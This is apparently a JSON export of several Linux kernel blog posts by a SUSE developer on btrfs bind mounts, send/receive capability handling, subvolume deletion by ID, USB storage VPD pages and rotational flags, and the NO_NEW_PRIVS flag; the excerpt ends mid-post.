/vol1 /mnt rw,relatime - btrfs /dev/loop0 rw,ssd,space_cache,subvolid=256,subvol=/vol1 36 29 0:31 /vol1/dir1 /storage/btrfs/another_mnt rw,relatime - btrfs /dev/loop0 rw,ssd,space_cache,subvolid=256,subvol=/vol1 By looking at the forth field, we can see an interesting info. The manpage describes this field as:\nroot: the pathname of the directory in the filesystem which forms the root of this mount.\nThe mountinfo proc file can show the path within the filesystem used at the mount time. In this case, we just need to check if the forth field contains the same subvolume path specified in the filesystem options.\nWhat if we create a bind mount using the same directory of the original mount?\n1 2 3 4 5 $ umount another_mnt $ mount --bind /mnt/ another_mnt $ cat /proc/self/mountinfo | grep btrfs | grep \u0026#34;subvolid=256,subvol=/vol1\u0026#34; 37 28 0:31 /vol1 /mnt rw,relatime - btrfs /dev/loop0 rw,ssd,space_cache,subvolid=256,subvol=/vol1 36 29 0:31 /vol1 /storage/btrfs/another_mnt rw,relatime - btrfs /dev/loop0 rw,ssd,space_cache,subvolid=256,subvol=/vol1 As we can see, both mount roots are the same since both mountpoints have the same contents. The bind mount is just another way of accessing the same content of /mnt.\nI used this approach in this patch in order to solve one of the logical-resolve issues when running the comannd on a openSUSE/SLE distribution. Now the command runs correctly and reports the file related to a logical-address in the filesystem:\n1 2 btrfs inspect-internal logical-resolve 5085913088 / //./home/marcos/.local/share/flatpak/repo/objects/00/7e3655177d55a02ca39d4cd3d095627f824b8004ad70f416eccb8bdd281fd5.file The patch was merged and is already part of btrfs-progs v5.10.1 along with other important fixes.\nThanks for reading!\n","permalink":"https://mpdesouza.com/blog/btrfs-differentiating-bind-mounts-on-subvolumes/","summary":"Explaining how to differentiate bind mounts on btrfs subvolumes","title":"btrfs: Differentiating bind mounts on subvolumes"},{"content":"The send/receive is a feature from btrfs where you can generate a stream of changes between two snapshots and then apply to any btrfs system, being a different disk on the host or over the network.\nThe receive feature receives a stream of data, applying the it in the filesystem. As the stream can be a file, it\u0026rsquo;s easy even to transfer the output of send over the network and receive in the other side. Here is an example of how this works:\n1 $ btrfs send /mnt/my_snapshot | ssh user@host \u0026#34;btrfs receive /mnt/my_backup\u0026#34; In this example, we are doing what we call a full send, which sends all data to the remote side. We can see what is being processed by the receiving side by using --dump argument:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 # creating a \u0026#34;disk\u0026#34; and the btrfs filesystem $ truncate -s 10G btrfs.disk $ mkfs.btrfs -f btrfs.disk # creating a subvolume and a snapshot with one file $ mount btrfs.disk /mnt $ btrfs subvolume create /mnt/vol1 Create subvolume \u0026#39;/mnt/vol1\u0026#39; $ touch /mnt/vol1/file.txt $ btrfs subvolume snapshot -r /mnt/vol1/ /mnt/snap1 Create a readonly snapshot of \u0026#39;/mnt/vol1/\u0026#39; in \u0026#39;/mnt/snap1\u0026#39; # create a full send stream from snap1 $ btrfs send /mnt/snap1 -f send.dump # dumping the contents of the stream $ btrfs receive -f send.dump --dump subvol ./snap1 uuid=50ce3050-4ff1-f441-8202-7e49f3ac9657 transid=7 chown ./snap1/ gid=0 uid=0 chmod ./snap1/ mode=755 utimes ./snap1/ atime=2020-05-08T16:32:50-0300 mtime=2020-05-08T16:33:07-0300 ctime=2020-05-08T16:33:07-0300 mkfile ./snap1/o257-7-0 rename ./snap1/o257-7-0 dest=./snap1/file.txt utimes ./snap1/ atime=2020-05-08T16:32:50-0300 mtime=2020-05-08T16:33:07-0300 ctime=2020-05-08T16:33:07-0300 chown ./snap1/file.txt gid=0 uid=0 chmod ./snap1/file.txt mode=644 utimes ./snap1/file.txt atime=2020-05-08T16:33:07-0300 mtime=2020-05-08T16:33:07-0300 ctime=2020-05-08T16:33:07-0300 # creating a subvolume to store the backups (this coudld be done in a different disk) $ btrfs subvolume create /mnt/bkp Create subvolume \u0026#39;/mnt/bkp\u0026#39; # applying the receiving the stream $ btrfs receive -f send.dump /mnt/bkp $ ls /mnt/bkp/snap1/file.txt /mnt/bkp/snap1/file.txt As we could see by the outputs above, the full send really specifies all actions, from the first snapshot creation, creation of files, adding a owner/group/mode and access time.\nAfter we have a backup, we can send just incremental changes. We call this an incremental send. We use a parent snapshot (-p argument) and compare it with a new snapshot. Look at the example below, using the same snapshots created in the steps above:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 # changing user/group of file.txt $ ls -l /mnt/vol1/file.txt -rw-r--r-- 1 root root 0 May 8 16:33 /mnt/vol1/file.txt $ chgrp 100 /mnt/vol1/file.txt $ chown users /mnt/vol1/file.txt $ ls -l /mnt/vol1/file.txt -rw-r--r-- 1 marcos users 0 May 8 16:33 /mnt/vol1/file.txt # create a new snapshot based in the current version of vol1 $ btrfs subvolume snapshot -r /mnt/vol1/ /mnt/snap2 Create a readonly snapshot of \u0026#39;/mnt/vol1/\u0026#39; in \u0026#39;/mnt/snap2\u0026#39; # create a new stream by comparing snap1 with snap2, and dumping the changes $ btrfs send -p /mnt/snap1/ /mnt/snap2 -f send.dump $ btrfs receive -f send.dump --dump snapshot ./snap2 uuid=16343add-4e38-e343-9af2-f64ff7d4b61d transid=15 parent_uuid=50ce3050-4ff1-f441-8202-7e49f3ac9657 parent_transid=7 utimes ./snap2/ atime=2020-05-08T16:41:26-0300 mtime=2020-05-08T16:33:07-0300 ctime=2020-05-08T16:33:07-0300 chown ./snap2/file.txt gid=100 uid=1001 utimes ./snap2/file.txt atime=2020-05-08T16:33:07-0300 mtime=2020-05-08T16:33:07-0300 ctime=2020-05-08T16:42:06-0300 # applying changes $ btrfs receive -f send.dump /mnt/bkp/ $ ls -l /mnt/bkp/snap2/file.txt -rw-r--r-- 1 marcos users 0 May 8 16:33 /mnt/bkp/snap2/file.txt This is what we call an incremental send. In this case, if we have a file that exists in both snapshots, but in the most recent one it only changed the owner/group, the send stream will contain only the chown command, instead of copying the content of the file over the network again. The receive side will apply the chown, and then the filesystem on the remote/local host will have the content of the most recent version.\nThis feature works nicely for all users, but there is a corner case when it comes to file capabilities.\nWhat is the problem with capabilities? Capabilities can be set per file, and they are meant to give part of the root powers to a common binary to be executed like it\u0026rsquo;s root, but without the over permissive setuid bit.\nWith the setuid, the application runs as root, but using capabilities the application still runs as your current user, but with a subset of the root powers, like CAP_KILL (the permission to kill other programs) or CAP_SYS_NICE (the permission to change the priority of other processes).\nIf you change the user or group of a file with capabilities, the kernel drops the capability.\nThe problem is: if you have a parent snapshot that contains a file with capabilities and the file changed the owner and later restored the capability, the current kernel code emits only the chown, making the receive side to drop the capability, even if the parent snapshot still has the same capability set.\nThis problem exists in all stable releases since v4.4.\nIt\u0026rsquo;s easy to reproduce the problem:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 # create a new sparse file with 5G of size, and create a btrfs fs on it $ fallocate -l5G disk.btrfs $ mkfs.btrfs disk.btrfs # mount the fs and create subvolumes fs1 and fs2 $ mount disk.btrfs /mnt $ btrfs subvolume create /mnt/fs1 $ btrfs subvolume create /mnt/fs2 # create a foo.bar file on fs1,and set a capabilities on it $ touch /mnt/fs1/foo.bar $ setcap cap_sys_nice+ep /mnt/fs1/foo.bar # create a readonly snapshot and send to fs2 (full send) $ btrfs subvol snap -r /mnt/fs1 /mnt/fs1/snap_init $ btrfs send /mnt/fs1/snap_init | btrfs receive /mnt/fs2 # change the capability on foo.bar, and restore the capability $ chgrp adm /mnt/fs1/foo.bar $ setcap cap_sys_nice+ep /mnt/fs1/foo.bar # create a new readonly snapshot containing foo.bar with different group $ btrfs subvol snap -r /mnt/fs1 /mnt/fs1/snap_inc # executing an incremental send comparing the two snapshots $ btrfs send -p /mnt/fs1/snap_init /mnt/fs1/snap_inc | btrfs receive fs2 At this point, the foo.bar sent to fs2 lost it\u0026rsquo;s capability:\n1 2 $ getcap /mnt/fs2/snap_init/foo.bar $ How to fix the issue? Simple: just emit the capabilities after the chown was emitted. The basic idea is:\nEmit chown Check if there are capabilities for this file If yes, emit them Here is a portion of the fix:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 if (need_chown) { ret = send_chown(sctx, sctx-\u0026gt;cur_ino, sctx-\u0026gt;cur_inode_gen, left_uid, left_gid); if (ret \u0026lt; 0) goto out; } if (need_chmod) { ret = send_chmod(sctx, sctx-\u0026gt;cur_ino, sctx-\u0026gt;cur_inode_gen, left_mode); if (ret \u0026lt; 0) goto out; } ret = send_capabilities(sctx); if (ret \u0026lt; 0) goto out; The patch itself is somewhat bigger, and exposes how btrfs managed inodes and its attributes, and I plan to write about it in the future.\nFor the most curious readers, here is the full path. Along with the patch solving the problem, a test was created in xfstests to ensure this problem won\u0026rsquo;t happen again in the future.\nThe kernel patch was merged in v5.8 and backported to affected all stale kernels.\nThanks for reading! See you in another post!\n","permalink":"https://mpdesouza.com/blog/btrfs-making-send-more-capable/","summary":"The tale of fixing a problem of send/receive on btrfs.","title":"btrfs: making \"send\" more \"capable\""},{"content":"I\u0026rsquo;m Marcos, a Kernel Livepatch developer at SUSE.\nI have contributed to interesting open source projects, like Linux Kernel, Linux Testing Project, btrfs-progs, virtme-ng, libvirt, LXC, bubblewrap, supportutils and others.\nFeel free to reach me out on Mastodon, LinkedIn or by email (me at mpdesouza.com).\n","permalink":"https://mpdesouza.com/about-me/","summary":"I\u0026rsquo;m Marcos, a Kernel Livepatch developer at SUSE.\nI have contributed to interesting open source projects, like Linux Kernel, Linux Testing Project, btrfs-progs, virtme-ng, libvirt, LXC, bubblewrap, supportutils and others.\nFeel free to reach me out on Mastodon, LinkedIn or by email (me at mpdesouza.com).","title":"About me"},{"content":"Btrfs is a very versatile filesystem, and it has a lot of features that don\u0026rsquo;t exist in any other mainline Linux filesystem. One of the key features of btrfs is the concept of subvolumes. A subvolume can be compared to a disk partition since each subvolume can contain it\u0026rsquo;s own filesystem tree and size limits. When created, subvolumes are shown as directories in the directory they were created.\nCreating a subvolume is as easy as creating a directory:\n1 $ btrfs subvolume create \u0026lt;mount point\u0026gt;/volume_name The same can be said of deleting a subvolume:\n1 $ btrfs subvolume delete \u0026lt;mount point\u0026gt;/volume_name As each subvolume can contain a different filesystem, you can even mount a subvolume as it was a partition:\n1 $ mount /dev/sdX -o subvol=volume_name \u0026lt;mount_point\u0026gt;/ But, if it has sibling subvolumes, let\u0026rsquo;s say subvol1 and subvol2 created under \u0026lt;mount_point\u0026gt;, when mounting subvol2 especially the user can\u0026rsquo;t reach subvol1 in the same \u0026lt;mount_point\u0026gt;. Let\u0026rsquo;s see an example:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 # allocate a 1G file $ fallocate -l 1G btrfs_fs # create a btrfs filesystem on it $ mkfs.btrfs btrfs_fs # mount it on /mnt $ mount btrfs_fs /mnt # create two subvolumes $ btrfs subvolume create /mnt/subvol1 $ btrfs subvolume create /mnt/subvol2 # list the subvolumes $ btrfs subvolume list /mnt ID 256 gen 6 top level 5 path subvol1 ID 257 gen 7 top level 5 path subvol2 $ ls /mnt subvol1 subvol2 # create a file unders each subvol directory $ touch /mnt/subvol1/file1 $ touch /mnt/subvol2/file2 $ ls -R /mnt /mnt: subvol1 subvol2 /mnt/subvol1: file1 /mnt/subvol2: file2 As you can see, two files were created. But, if the user mounts a specific subvolume under /mnt it won\u0026rsquo;t be able to reach the other subvolume by the same mount point.\n1 2 3 4 5 6 7 8 9 10 $ umount /mnt $ mount btrfs_fs -o subvol=subvol2 /mnt $ ls -R /mnt /mnt: file2 $ btrfs subvolume list /mnt ID 256 gen 6 top level 5 path subvol1 ID 257 gen 7 top level 5 path subvol2 By the code above, subvol1 can\u0026rsquo;t be reached anymore, but it\u0026rsquo;s listed by subvolume list. Up until now, to remove a subvolume, the user should be able to reach it from the mount point. With the given example, the only way to delete the subvolume is to mount the filesystem in another mount point and delete subvol1:\n1 2 3 4 5 6 7 $ mount btrfs_fs /tmp/test $ ls /tmp/test subvol1 subvol2 $ btrfs subvolume delete /tmp/test/subvol1 Delete subvolume (no-commit): \u0026#39;/tmp/test/subvol1\u0026#39; Recent commits in Linux kernel and btrfs-progs package changed this situation. By using the --subvolid argument a user can specify subvolume to be deleted:\n1 2 3 4 5 6 7 8 9 10 11 12 13 $ btrfs subvolume list /mnt ID 256 gen 6 top level 5 path subvol1 ID 257 gen 7 top level 5 path subvol2 $ ls -R /mnt /mnt: file2 $ btrfs subvolume delete --subvolid 256 /mnt Delete subvolume (no-commit): \u0026#39;/mnt/subvol1\u0026#39; $ btrfs subvolume list /mnt ID 257 gen 7 top level 5 path subvol2 A new ioctl, BTRFS_IOC_SNAP_DESTROY_V2, was added in Linux kernel, and support for this ioctl was added in btrfs-progs and libbtrfsutil to make it possible. One possible user of this new feature is snapper, which has to deal with subvolume creation and deletion from time to time.\nIf you want to dig deeper into the details of this feature, take a look at the feature request and in the commits in Linux Kernel, btrfs-progs and a test at xfstests.\nThanks for reading!\n","permalink":"https://mpdesouza.com/blog/new-btrfs-feature-delete-subvolumes-using-subvolume-ids/","summary":"Literally, btrfs subvolume delete 2.0","title":"New btrfs feature: Delete subvolumes using subvolume ids"},{"content":"After chasing the problem of rotational sysfs property of USB flash drives, I started to check another sysfs attributes of USB storage devices, and I noted two missing attributes: vpd_pg80 and vpd_pg83.\nAs explained here, VPD pages contain data related to the device. In special, page 80 is Unit Serial Number (sn) and page 83 is Device Information (di), which are present in any SCSI device that complies with SPC-2 or later.\nCheck an example of my sn and di of my SSD using sg_vpd from sg3_utils package:\n1 2 3 4 5 6 7 8 9 10 11 $ sg_vpd --page 0x80 /dev/sda Unit serial number VPD page: Unit serial number: FS71N654610101U37 $ sg_vpd --page 0x83 /dev/sda Device Identification VPD page: Addressed logical unit: designator type: vendor specific [0x0], code set: ASCII vendor specific: FS71N654610101U37 designator type: T10 vendor identification, code set: ASCII vendor id: ATA vendor specific: SK hynix SC300 SATA 512GB FS71N654610101U37 This information is exported as attributes of storage devices in sysfs, like my HDD and SSD devices below:\n1 2 3 4 5 $ ls /sys/block/sd[ab]/device/vpd* /sys/block/sda/device/vpd_pg80 /sys/block/sda/device/vpd_pg83 /sys/block/sdb/device/vpd_pg80 /sys/block/sdb/device/vpd_pg83 This is true for the majority of storage devices, but not for USB flash drives. Most USB storage devices don’t have these attributes in sysfs, even when sg_vpd clearly shows them, like below:\n1 2 3 4 5 6 7 8 9 10 11 $ sg_vpd --page 0x80 /dev/sdc Unit serial number VPD page: Unit serial number: 4C530001300722111594 $ sg_vpd --page 0x83 /dev/sdc Device Identification VPD page: Addressed logical unit: designator type: T10 vendor identification, code set: ASCII vendor id: SanDisk vendor specific: Cruzer Blade $ ls /sys/block/sdc/device/vpd* zsh: no matches found: /sys/block/sdc/device/vpd* I\u0026rsquo;ve tested a bunch of different USB flash devices and USB to SATA adapters in my previous post, and neither of them had vpd_pg80 and vpd_pg83 in sysfs, although all SanDisk Cruzer Blade devices tested expose these VPD pages (thanks to my friend Alexandre Vicenzi who also had a Cruzer Blades to test).\nIn order to understand the problem, I decided to look at the kernel code. By using grep, I found a couple of interesting files:\n1 2 3 4 $ git grep -l pg80 drivers/scsi/scsi.c drivers/scsi/scsi_sysfs.c include/scsi/scsi_device.h At first glance, scsi_sysfs.c seems the best place to start. This file describes the sysfs attributes of SCSI devices, like vpd_pg80 and how the values of this properly is presented. So far, no information from where it is assigned.\nFile scsi.c had some answers. Looking at function scsi_attach_vpd, we can clearly see where the SCSI layer checks for Device Information and Serial Number.\nBut, let\u0026rsquo;s look at the first function that scsi_attach_vpd calls:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 /** * scsi_device_supports_vpd - test if a device supports VPD pages * @sdev: the \u0026amp;amp;struct scsi_device to test * * If the \u0026#39;try_vpd_pages\u0026#39; flag is set it takes precedence. * Otherwise we will assume VPD pages are supported if the * SCSI level is at least SPC-3 and \u0026#39;skip_vpd_pages\u0026#39; is not set. */ static inline int scsi_device_supports_vpd(struct scsi_device *sdev) { /* Attempt VPD inquiry if the device blacklist explicitly calls * for it. */ if (sdev-\u0026gt;try_vpd_pages) return 1; /* * Although VPD inquiries can go to SCSI-2 type devices, * some USB ones crash on receiving them, and the pages * we currently ask for are mandatory for SPC-2 and beyond */ if (sdev-\u0026gt;scsi_level \u0026gt;= SCSI_SPC_2 \u0026amp;\u0026amp; !sdev-\u0026gt;skip_vpd_pages) return 1; return 0; } By looking at this function we can presume that try_vpd_pages flag is not set and skip_vpd_pages is. We can discard checking scsi_level because Cruzer Blade is SPC-4 compliant:\n1 2 3 $ sg_inq /dev/sdc | head -2 standard INQUIRY: PQual=0 Device_type=0 RMB=1 LU_CONG=0 version=0x06 [SPC-4] By looking at the comment of scsi_device_supports_vpd, some USB devices crash after checking their VPD pages, in this case, it makes sense to not enable VPD for all devices. Although, our SanDisk Cruzer Blade device clearly supports VPD and does not crash.\nscsi_device_supports_vpd is called in two places: scsi_add_lun and scsi_rescan_device. These callers are common path of device setup, so fixing skip_vpd_pages should be enough.\nLet\u0026rsquo;s grep again in the kernel source code to check where skip_vpd_pages is being set:\n1 2 3 4 5 $ git grep -l skip_vpd_pages drivers/scsi/scsi.c drivers/scsi/scsi_scan.c drivers/usb/storage/scsiglue.c include/scsi/scsi_device.h Interesting to see that USB layer setting this flag. Let’s check drivers/usb/stoarge/scsiglue.c file:\n1 2 /* Some devices don\u0026#39;t handle VPD pages correctly */ sdev-\u0026gt;skip_vpd_pages = 1; By the code above, which belongs to slave_configure function, USB layer disables VPD for all USB storage devices. Makes sense, since some devices are reported to crash when checking for VPD, as stated before.\nBut, shouldn’t we add support for SanDisk Cruzer Blade at least? There is a per device mapping with specific flags in SCSI layer that should help to fix this situation, specially regarding try_vpd_pages. To add support for SanDisk Cruzer Blade* devices, I submited this patch to the kernel mailing list and it’s now merged:\n1 2 3 4 5 {\u0026#34;LENOVO\u0026#34;, \u0026#34;Universal Xport\u0026#34;, \u0026#34;*\u0026#34;, BLIST_NO_ULD_ATTACH}, + {\u0026#34;SanDisk\u0026#34;, \u0026#34;Cruzer Blade\u0026#34;, NULL, BLIST_TRY_VPD_PAGES | + BLIST_INQUIRY_36}, {\u0026#34;SMSC\u0026#34;, \u0026#34;USB 2 HS-CF\u0026#34;, NULL, BLIST_SPARSELUN | BLIST_INQUIRY_36}, ... The patch adds specific flags that will be checked in SCSI layer and will be applied once the SanDisk Cruzer Blade* device is found. This change alone does not fix the problem as the flag skip_vpd_pages is still enabled. So I submited a second patch, to only set skip_vpd_pages when try_vpd_pages is not set allowing the SCSI layer to process all VPD pages when try_vpd_pages is set.\n1 2 3 4 5 6 7 - /* Some devices don\u0026#39;t handle VPD pages correctly */ - sdev-\u0026gt;skip_vpd_pages = 1; + /* + * Some devices don\u0026#39;t handle VPD pages correctly, so skip vpd + * pages if not forced by SCSI layer. + */ + sdev-\u0026gt;skip_vpd_pages = !sdev-\u0026gt;try_vpd_pages; With these two patches applied SanDisk Cruzer Blade USB flash device is able to properly show the VPD pages in sysfs:\n1 2 3 4 5 6 7 8 9 10 11 $ cat /sys/block/sda/device/vendor SanDisk $ cat /sys/block/sda/device/model Cruzer Blade $ cat /sys/block/sda/device/vpd_pg80 4C530001300722111594 $ cat /sys/block/sda/device/vpd_pg83 0,SanDiskCruzer Blade4C530001300722111594 That\u0026rsquo;s all for today. Stay tuned for more posts about Kernel and whatnot, see ya!\n","permalink":"https://mpdesouza.com/blog/kernel-adventures-enabling-vpd-pages-for-usb-storage-devices-in-sysfs/","summary":"USB with VPD on sysfs","title":"Kernel Adventures: Enabling VPD Pages for USB Storage Devices in sysfs"},{"content":"A while ago I\u0026rsquo;ve found this kernel bug entry about USB mass storage being shown as a rotational device. This is wrong because a USB stick is a flash device, and does not rotate.\nAbout rotational devices Let’s take a minute to discuss about the evolution from disk to flash storage.\nOlder storage devices, HDD in this example, were called Disk Storage because these devices recorded data into one or more rotating disks. In such devices, the rotation speed was a feature that informed how fast the device was. A device with 5400 RPM (Rotations Per Minute) was slower than a device with 7200 RPM, for example.\nAn example of a working HDD, a rotational disk. Reference: https://www.behance.net/gallery/25354853/HDD-Animation\nThese devices were known to spend a large amount of time only to position the arm/head of the disk in the right sector/track to read the desired data. If a disk spins faster, so you can get your data faster.\nFlash Storage USB sticks and SSD storage devices are Non-Volatile Memory, which is much faster when compared to the disk storage because they don’t need a mechanical rotational procedure to find the stored data. Data is stored in an array of transistors, and the seek time to find the desired data is constant while seek time can vary in rotational devices due to the position of the head needed to be positioned in different places of storage disk.\nInside of a SSD device. Reference: https://www.backblaze.com/blog/hdd-versus-ssd-whats-the-diff/\nBack to the bug My idea was to check the kernel code in order to understand how it works. First of all, USB mass storage uses SCSI commands to transfer data between host and USB device. With this in mind, there are two layers in kernel to check: SCSI and USB.\nBy looking at Linux kernel code, specifically function sd_revalidate_disk in drivers/scsi/sd.c:\n1 2 3 4 5 6 7 /* * set the default to rotational. All non-rotational devices * support the block characteristics VPD page, which will * cause this to be updated correctly and any device which * doesn’t support it should be treated as rotational. */ blk_queue_flag_clear(QUEUE_FLAG_NONROT, q); This function is called when a disk is detected. It first sets the disk as rotational, by clearing the NONROT flag (yes, it’s confusing at first glance). A few lines bellow this point, we can see the following code:\n1 2 3 4 5 6 if (scsi_device_supports_vpd(sdp)) { sd_read_block_provisioning(sdkp); sd_read_block_limits(sdkp); sd_read_block_characteristics(sdkp); sd_zbc_read_zones(sdkp, buffer); } We need some background about VPD. VPD stands for Vital Product Data, and presents information and configuration about a device, a SCSI device in this case. VPD was introduced in SCSI Primary Commands (SPC) 2 specification, and can be “queried” from any SCSI storage device by using sg_utils3 package:\n1 2 3 4 5 6 7 8 9 $ sg_vpd /dev/sda Supported VPD pages VPD page: Supported VPD pages [sv] Unit serial number [sn] Device identification [di] ATA information (SAT) [ai] Block limits (SBC) [bl] Block device characteristics (SBC) [bdc] Logical block provisioning (SBC) [lbpv] This is the output of my SSD device. Going back to our original problem, rotating USB storage, the function sd_read_block_characteristics does something interesting:\n1 2 3 4 5 6 7 8 9 10 11 if (!buffer || /* Block Device Characteristics VPD */ scsi_get_vpd_page(sdkp-\u0026gt;device, 0xb1, buffer, vpd_len)) goto out; rot = get_unaligned_be16(buffer[4]); if (rot == 1) { blk_queue_flag_set(QUEUE_FLAG_NONROT, q); blk_queue_flag_clear(QUEUE_FLAG_ADD_RANDOM, q); } The code above reads the Block Device Characteristics VPD page, which is present only in SPC-3 or later. Again, sg_vpd can help us to check BDC:\n1 2 3 4 5 6 7 8 9 10 11 12 13 $ sg_vpd — page bdc /dev/sda Block device characteristics VPD page (SBC): Non-rotating medium (e.g. solid state) Product type: Not specified WABEREQ=0 WACEREQ=0 Nominal form factor not reported ZONED=0 RBWZ=0 BOCS=0 FUAB=0 VBULS=0 DEPOPULATION_TIME=0 (seconds) As you can see, the Block Device Characteristics of my SSD device says clearly: Non-rotation Medium. Per the function above, the NONROT flag will be set, so sysfs will show when reading the rotational attribute of this device:\n1 2 $ cat /sys/block/sda/queue/rotational 0 Moving further, I have another storage disk, now an HDD:\n1 2 3 4 5 6 7 8 9 10 11 12 13 $ sg_vpd — page bdc /dev/sdb Block device characteristics VPD page (SBC): Nominal rotation rate: 5400 rpm Product type: Not specified WABEREQ=0 WACEREQ=0 Nominal form factor not reported ZONED=0 RBWZ=0 BOCS=0 FUAB=0 VBULS=0 DEPOPULATION_TIME=0 (seconds) Nominal rotation rate: 5400 rpm. Indeed, it’s a rotational device. But, what about USB sticks?\nI’ve tested more than 10 USB sticks and USB SATA adapters, and neither of them have BDC exposed. Let’s use sg_inq to check if these which version of SCSI/SPC they implement, and which VPD they expose:\nAlcor Micro Corp. Flash Drive 058f:6387 (USB Stick) 1 2 3 4 5 6 7 8 $ sg_inq -s /dev/sdc standard INQUIRY: PQual=0 Device_type=0 RMB=1 LU_CONG=0 version=0x04 [SPC-2] $ sg_vpd --page 0x0 /dev/sdc Supported VPD pages VPD page: Supported VPD pages [sv] Unit serial number [sn] Device identification [di] Chipsbank Microelectronics Co., Ltd 1e3d:2092 (USB Stick) 1 2 3 4 5 6 7 8 9 $ sg_inq /dev/sdc invalid VPD response; probably a STANDARD INQUIRY response standard INQUIRY: PQual=0 Device_type=0 RMB=1 LU_CONG=0 version=0x02 [SCSI-2] $ sg_vpd --page 0x0 /dev/sdc Supported VPD pages VPD page: invalid VPD response; probably a STANDARD INQUIRY response fetching VPD page failed: Malformed SCSI command sg_vpd failed: Malformed SCSI command This device does not even implements VPD.\nHP, Inc 4 GB flash drive 03f0:3207 (USB stick) 1 2 3 4 5 6 7 8 9 $ sg_inq /dev/sdc invalid VPD response; probably a STANDARD INQUIRY response standard INQUIRY: PQual=0 Device_type=0 RMB=1 LU_CONG=0 version=0x00 [no conformance claimed] $ sg_vpd /dev/sdc Supported VPD pages VPD page: invalid VPD response; probably a STANDARD INQUIRY response fetching VPD page failed: Malformed SCSI command sg_vpd failed: Malformed SCSI command This one is even worse, does not even comply with any specification.\nSanDisk Corp. Cruzer Blade 0781:5567 (USB Stick) 1 2 3 4 5 6 7 8 $ sg_inq /dev/sdc standard INQUIRY: PQual=0 Device_type=0 RMB=1 LU_CONG=0 version=0x06 [SPC-4] $ sg_vpd --page 0x0 /dev/sdc Supported VPD pages VPD page: Supported VPD pages [sv] Unit serial number [sn] Device identification [di] This one from SanDisk complies with SPC-4, but no BDC supported either.\nSuper Top M6116 SATA Bridge 14cd:6116 (USB SATA adapter) 1 2 3 4 5 $ sg_inq /dev/sdc standard INQUIRY: PQual=0 Device_type=0 RMB=0 LU_CONG=0 version=0x00 [no conformance claimed] $ sg_vpd --page 0x0 /dev/sdc Supported VPD pages VPD page: It doesn’t show any VPD, but apprently understands the SCSI INQ command.\nInitio Corporation 13fd:3920 (USB SATA adapter) 1 2 3 4 5 6 7 8 $ sg_inq /dev/sdc standard INQUIRY: PQual=0 Device_type=0 RMB=0 LU_CONG=0 version=0x06 [SPC-4] $ sg_vpd --page 0x0 /dev/sdc Supported VPD pages VPD page: Supported VPD pages [sv] Unit serial number [sn] Device identification [di] Another device which implements SPC-4 and does not expose BDC.\nConclusion Without Block Device Characteristics, the kernel cannot say for sure if the device is rotational or not, so the NONROT flag keeps cleared.\nThe rotational information can be used to change the IO scheduler related to the device, as openSUSE currently does:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 $ cat /usr/lib/udev/rules.d/60-io-scheduler.rules # Set optimal IO schedulers for HDD and SSD ACTION!=\u0026#34;add\u0026#34;, GOTO=\u0026#34;scheduler_end\u0026#34; SUBSYSTEM!=\u0026#34;block\u0026#34;, GOTO=\u0026#34;scheduler_end\u0026#34; # Do not change scheduler if `elevator` cmdline parameter is set IMPORT{cmdline}=\u0026#34;elevator\u0026#34; ENV{elevator}==\u0026#34;?*\u0026#34;, GOTO=\u0026#34;scheduler_end\u0026#34; # Determine if BLK-MQ is enabled TEST==\u0026#34;%S%p/mq\u0026#34;, ENV{.IS_MQ}=\u0026#34;1\u0026#34; # MQ: BFQ scheduler for HDD ENV{.IS_MQ}==\u0026#34;1\u0026#34;, ATTR{queue/rotational}!=\u0026#34;0\u0026#34;, ATTR{queue/scheduler}=\u0026#34;bfq\u0026#34; # MQ: deadline scheduler for SSD ENV{.IS_MQ}==\u0026#34;1\u0026#34;, ATTR{queue/rotational}==\u0026#34;0\u0026#34;, ATTR{queue/scheduler}=\u0026#34;mq-deadline\u0026#34; # Non-MQ: CFQ scheduler for HDD ENV{.IS_MQ}!=\u0026#34;1\u0026#34;, ATTR{queue/rotational}!=\u0026#34;0\u0026#34;, ATTR{queue/scheduler}=\u0026#34;cfq\u0026#34; # Non-MQ: deadline scheduler for SSD ENV{.IS_MQ}!=\u0026#34;1\u0026#34;, ATTR{queue/rotational}==\u0026#34;0\u0026#34;, ATTR{queue/scheduler}=\u0026#34;deadline\u0026#34; LABEL=\u0026#34;scheduler_end\u0026#34; Picking the right IO scheduler helps to extract the best performancee of your storage device. For example BFQ IO scheduler would reorder read/write requests, trying to make them contiguous in order to extract the best of performance from an HDD disk. Remember, HDD devices have the head that needs to be positioned in the right place to get your data, and avoiding it to be moved randomly helps to improve performance.\nThe above is true for HDD devices but doesn’t help much SSD devices which don’t have the performance penalty of the seek time, so mq-deadline would be a better solution for this cases. This scheduler prefer reads over writes not reordering requests, and that’s all, making it perform better in SSD devices.\nStay tuned for our next topic about IO schedulers and other things related to block layer. See you next time!\n","permalink":"https://mpdesouza.com/blog/kernel-adventures-are-usb-sticks-rotational-devices/","summary":"Understanding why USB devices are usually set as rotational devices on Linux","title":"Kernel Adventures: Are USB Sticks Rotational Devices?"},{"content":"Proposed in 2012, the NO_NEW_PRIVS flag made possible to any process to avoid privilege escalation when this behavior is not desired. After the flag is set, it persists across execve, clone and fork syscalls, and cannot be cleared. This can help you to avoid exploitation of vulnerable software, since the attacker will be running as an ordinary user.\nThe NO_NEW_PRIVS flag is already beeng used by some projects that try to make the running environment more secure, specially container engines and sandbox applications. Some examples are Docker, Bullewrap, and Firejail.\nThere are cases where privilege escalation is necessary, for example, to execute a small task that can’t be done by an unprivileged user. This can be achieved by creating a new binary, that only do a very specific task, and have the setuid bit set (which change the current uid by the owner of the binary) or file capabilities(which can hold CAP_SYS_ADMIN for example, and so the current uid becomes practically root).\nAnother important note for NO_NEW_PRIVS is, after this flag is set, an unprivileged process can install seccomp_filters.\nAs described by the official kernel documentation about NO_NEW_PRIVS, this flag is set by using prctl, as exemplified below:\n1 prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0); Let’s check how this works. First, we create a new binary called caller, which will be responsible for executing another binary, simply called getuid. The second binary will just print the current 